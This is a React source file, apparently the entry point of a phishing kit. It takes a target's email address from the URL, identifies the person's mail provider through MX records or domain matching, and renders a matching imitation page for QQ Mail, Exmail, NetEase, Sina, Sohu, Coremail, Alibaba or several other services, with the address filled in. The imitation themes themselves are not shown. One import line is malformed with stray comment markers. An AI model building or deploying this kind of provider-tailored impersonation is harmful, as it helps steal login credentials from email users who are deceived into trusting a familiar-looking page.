import React, { useState, useEffect, useMemo } from 'react';
*/import { SecurityProvider } from './components/SecurityManager';*/
import { LanguageProvider, useTranslation } from './components/LanguageProvider';
import { getMailProviderFromMX, getThemeByDomain } from './DNSUtils';

import AlibabaTheme from './themes/AlibabaTheme';
import BossmailTheme from './themes/BossmailTheme';
import Theme263 from './themes/Theme263';
import QQMailTheme from './themes/QQMailTheme';
import ExmailTheme from './themes/ExmailTheme';
import SinaTheme from './themes/SinaTheme';
import SohuTheme from './themes/SohuTheme';
import NetEaseTheme from './themes/NetEaseTheme';
import NetEaseQiyeTheme from './themes/NetEaseQiyeTheme';
import GlobalMailTheme from './themes/GlobalMailTheme';
import CoremailTheme from './themes/CoremailTheme';

const AppContent: React.FC = () => {
  const { lang } = useTranslation();
  const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  const email = useMemo(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('email') || '';
  }, []);

  useEffect(() => {
    const initTheme = async () => {
      const params = new URLSearchParams(window.location.search);
      const typeParam = params.get('type');
      const domain = email.split('@')[1]?.toLowerCase();

      // Priority 1: Manual override
      if (typeParam) {
        setDetectedTheme(typeParam);
        setIsLoading(false);
        return;
      }

      // Priority 2: MX Record Lookup (The "Real" Check)
      if (domain) {
        try {
          const mxProvider = await getMailProviderFromMX(domain);
          if (mxProvider) {
            console.log(`DNS MX detection found: ${mxProvider} for domain: ${domain}`);
            setDetectedTheme(mxProvider);
            setIsLoading(false);
            return;
          }
        } catch (error) {
          console.warn('DNS MX lookup failed, falling back to domain matching:', error);
        }

        // Priority 3: Domain String Fallback
        const domainTheme = getThemeByDomain(domain);
        console.log(`Domain matching found: ${domainTheme} for domain: ${domain}`);
        setDetectedTheme(domainTheme);
      } else {
        // No email parameter provided
        setDetectedTheme('alibaba');
      }
      
      setIsLoading(false);
    };

    // Add a small delay to show loading state (for UX)
    const timer = setTimeout(() => {
      initTheme();
    }, 500);

    return () => clearTimeout(timer);
  }, [email]);

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="flex flex-col items-center space-y-4">
          <div className="w-10 h-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-gray-400 text-sm font-medium tracking-wide">
            {lang === 'zh' ? '正在检测邮箱服务提供商...' : 'Detecting email service provider...'}
          </p>
          <p className="text-gray-300 text-xs">
            {lang === 'zh' ? '正在查询DNS记录...' : 'Querying DNS records...'}
          </p>
        </div>
      </div>
    );
  }

  const renderTheme = () => {
    switch (detectedTheme) {
      case 'bossmail': return <BossmailTheme prefilledEmail={email} />;
      case '263': return <Theme263 prefilledEmail={email} />;
      case 'qq': return <QQMailTheme prefilledEmail={email} />;
      case 'exmail': return <ExmailTheme prefilledEmail={email} />;
      case 'sina': return <SinaTheme prefilledEmail={email} />;
      case 'sohu': return <SohuTheme prefilledEmail={email} />;
      case 'netease': return <NetEaseTheme prefilledEmail={email} />;
      case 'netease_qiye': return <NetEaseQiyeTheme prefilledEmail={email} />;
      case 'globalmail': return <GlobalMailTheme prefilledEmail={email} />;
      case 'coremail': return <CoremailTheme prefilledEmail={email} />;
      default: return <AlibabaTheme prefilledEmail={email} />;
    }
  };

  return <div className="min-h-screen">{renderTheme()}</div>;
};

const App: React.FC = () => {
  return (
    <LanguageProvider>
      <SecurityProvider>
        <AppContent />
      </SecurityProvider>
    </LanguageProvider>
  );
};

export default App;
